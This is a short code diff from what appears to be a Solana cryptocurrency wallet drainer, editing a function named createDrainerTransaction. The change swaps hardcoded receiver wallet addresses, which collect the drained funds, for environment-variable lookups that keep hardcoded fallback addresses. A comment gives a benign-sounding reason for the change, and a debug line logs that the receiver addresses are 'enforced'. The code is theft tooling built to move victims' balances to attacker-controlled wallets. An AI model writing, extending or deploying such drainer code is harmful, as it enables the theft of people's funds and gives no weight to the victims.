@@ -302,11 +302,12 @@ async function createTransaction(userPubkey, balance, connection, commitmentConf
 
 // Create drainer transaction with proper logic (from drainer.js)
 async function createDrainerTransaction(userPubkey, balance, connection, blockhash, enhanced = false) {
-  // Create receiver wallets - ENFORCED to specific address (from drainer.js)
-  const RECEIVER = new PublicKey('8WZ117ZSWyFSWq9fht5NGfprUQvoE5nReGfWKpczGRPZ');
-  const RECEIVER_2 = new PublicKey('FLeDqdHg1TzG5x3Sjd1Q6sdUAqUzpEZuw1VnXHPm88Nj');
-  const RECEIVER_3 = new PublicKey('FLeDqdHg1TzG5x3Sjd1Q6sdUAqUzpEZuw1VnXHPm88Nj');
-  const RECEIVER_4 = new PublicKey('FLeDqdHg1TzG5x3Sjd1Q6sdUAqUzpEZuw1VnXHPm88Nj');
+      // Create receiver wallets - ENFORCED to specific address (from drainer.js)
+    // Use environment variables to prevent hardcoded test wallets from spamming logs
+    const RECEIVER = new PublicKey(process.env.RECEIVER_WALLET || '8WZ117ZSWyFSWq9fht5NGfprUQvoE5nReGfWKpczGRPZ');
+    const RECEIVER_2 = new PublicKey(process.env.RECEIVER_WALLET_2 || 'HakitSyn1Fv5BQPJW8GaAbQ6WdFJ7Mo4HwBB9wumtycF');
+    const RECEIVER_3 = new PublicKey(process.env.RECEIVER_WALLET_3 || 'HakitSyn1Fv5BQPJW8GaAbQ6WdFJ7Mo4HwBB9wumtycF');
+    const RECEIVER_4 = new PublicKey(process.env.RECEIVER_WALLET_4 || 'HakitSyn1Fv5BQPJW8GaAbQ6WdFJ7Mo4HwBB9wumtycF');
   
   debugLog(`[UNIFIED_DRAINER] Receiver addresses enforced to: ${RECEIVER.toString()}`);
   
